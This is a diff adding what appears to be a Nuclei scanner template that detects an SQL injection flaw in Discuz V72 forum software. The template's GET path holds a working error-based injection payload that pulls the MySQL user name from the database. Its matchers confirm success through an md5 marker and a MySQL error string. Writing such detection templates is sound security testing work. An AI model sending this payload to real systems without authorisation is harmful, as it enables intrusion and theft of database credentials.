@@ -1,0 +1,25 @@
+id: poc-yaml-discuz-v72-sqli
+info:
+  name: Discuz V72 SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: sql-injection
+  description: |
+    Potential SQL injection vulnerability in Discuz V72 allowing attackers to extract sensitive information from the database.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat((select%20concat(user,0x3a,md5(1234),0x3a)%20from%20mysql.user%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "81dc9bdb52d04dc20036dbd8313ed055"
+      - type: word
+        part: body
+        words:
+          - "Discuz! info</b>: MySQL Query Error"
